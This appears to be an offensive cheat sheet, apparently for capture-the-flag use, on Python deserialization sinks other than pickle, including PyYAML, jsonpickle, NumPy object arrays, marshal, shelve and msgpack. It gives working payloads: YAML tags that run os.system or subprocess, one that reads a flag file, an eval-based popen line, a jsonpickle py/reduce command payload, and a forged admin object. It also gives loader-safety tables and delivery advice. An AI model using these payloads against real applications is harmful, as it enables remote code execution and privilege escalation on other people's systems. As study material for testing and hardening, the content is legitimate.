# Python — the non-pickle deserialization sinks

## The format census — what else reaches code

| Sink | Parser | Typed-object hook | Marker |
|---|---|---|---|
| PyYAML `yaml.load` | `!!python/object` | `__init__`+`__setstate__` via `from_yaml` | `!!python/object:` |
| `yaml.unsafe_load`/`FullLoader`+`!!python` | same | same | same |
| `jsonpickle.decode` | `py/object` key | object.__setstate__ | `{"py/object":"mod.Cls"}` |
| `dill.loads` | pickle superset | same as pickle | `\x80\x04` |
| `marshal.loads` | bytecode-ish | code objects — needs a callable wrapper | raw code obj |
| `shelve`/`dbm` | shelve = pickle inside | same as pickle | dbm file |
| NumPy `.npy` `allow_pickle=True` | object arrays | embedded pickle | `\x93NUMPY` |
| `joblib.load` | pickle wrapper | same | joblib file |
| `pandas.read_pickle` | pickle | same | `.pkl` |
| `msgpack` ext types | custom ext codec | app-defined | `C7`-`C9` ext |
| `sqlite3` blob fields | app-dependent | app-dependent | raw |

## PyYAML — the typed-tag parser

```yaml
# unsafe tag → instantiate any class
!!python/object:os.system ['id']
!!python/object/apply:os.system ['id']
!!python/object/new:subprocess.check_output [['id']]
!!python/object/apply:subprocess.check_output [['cat','/flag']]

# the reduce-style tag — callable(*args)
!!python/object/apply:eval ["__import__('os').popen('id').read()"]

# a real class with a malicious __init__/__setstate__
!!python/object:app.models.User {is_admin: true}
```

### Loader table — which call is unsafe

| Call | `!!python/*` accepted? |
|---|---|
| `yaml.load(x)` (PyYAML < 5.4, no Loader arg) | YES — the classic bug |
| `yaml.load(x, Loader=yaml.Loader)` | YES |
| `yaml.load(x, Loader=yaml.UnsafeLoader)` | YES |
| `yaml.full_load` / `Loader=yaml.FullLoader` | `!!python/object` YES, `apply`/`new` NO |
| `yaml.safe_load` / `Loader=SafeLoader` | NO — all `python/*` refused |
| `yaml.safe_load` + `add_constructor` | only the registered tag |

**FullLoader is NOT safe** — it rejects `apply`/`new` but still instantiates
`!!python/object:` for any class with a parameterless-friendly ctor.

### `add_constructor` / custom tags — app-side attack surface

```python
yaml.SafeLoader.add_constructor('!rce', make_thing)
```

A custom tag registered on SafeLoader accepts a `!rce` tag — the sink is the
app's own constructor function. If that constructor calls `eval`/`exec`/
`getattr`/`__import__`, your tag reaches it.

## jsonpickle — `py/object` resurrection

```json
{"py/object": "os.system", "py/reduce": [{"py/function":"os.system"}, {"py/tuple":["id"]}]}
{"py/object": "__main__.Evil", "state": {"x": 1}}
```

`jsonpickle.decode` walks `py/object` → imports it → `__setstate__`/attrs.
The `py/reduce` form runs a callable+args directly. Version matters — newer
jsonpickle warns but still loads.

## NumPy `.npy` allow_pickle — the ML-shaped sink

```
\x93NUMPY\x01\x00   header
'...descr...'
object array data   ← a raw pickle stream when allow_pickle=True
```

`numpy.load(f)` defaults `allow_pickle=False` — but `allow_pickle=True` is
passed every time a model/embedding is loaded. A crafted `.npy` with an
object array is a pickle stream with extra header bytes.

## marshal / code objects — the hard-but-real path

`marshal.loads` yields a `code` object — only dangerous if the app then
`exec`s/`eval`s/`types.FunctionType`s it. A sink that does
`exec(marshal.loads(x))` runs the code object — your bytes ARE bytecode.
Compile the payload once, marshal it, deliver.

## shelve / dbm — file-backed pickle

`shelve.open(path)` stores each value as a pickle — the attack is a
writable shelve file the app re-opens. Same grammar, different delivery.

## msgpack ext types — app-defined codec

```
0xC7 len type   ext8
0xC8 len type   ext16
0xC9 len type   ext32
```

`msgpack.unpackb(data, ext_hook=...)` — the app's `ext_hook` is the sink.
If `ext_hook` routes to a class constructor, `pickle.loads`, or `eval`,
the ext payload reaches it. `tools/msgpack_read.py blob` decodes the frame
and prints the ext types — but the DANGEROUS bit is the app-side hook.

## bson / protobuf / thrift / avro — typed-data formats

These are data formats — no code execution *in the parser* itself. The bug
is always in what the app does with the decoded value:

- `bson` document with a `$where`/`$regex` reaching a NoSQL filter → nosqli
- `protobuf` message whose field reaches `eval`/`exec`/deserialization
- `bson`/`msgpack` object the app `eval`s a field of
- a protobuf Any/Ext field the app unmarshals into a trusted type

`tools/forensics/bson_dump.py` decodes the document; `proto_decode.py`
walks protobuf wire format. The exploit is downstream, not in the parser.

## The "is it a pickle in disguise" reflex

A `*.pkl`, `*.npy` (with allow_pickle), `*.joblib`, shelve db, or a
`gAN...`/`gAR...` base64 blob is a pickle. A `!!python/object` YAML is a
typed-object parser. A `py/object` JSON is jsonpickle. Each routes to the
same `__reduce__`/`__setstate__` mechanics — the wrapper differs, the
primitive is the same.

## Output to record

- Which parser (yaml.load? jsonpickle.decode? joblib.load?)
- Whether the tag/field is typed (`!!python`, `py/object`, ext-hook)
- The exact payload and the verbatim response excerpt
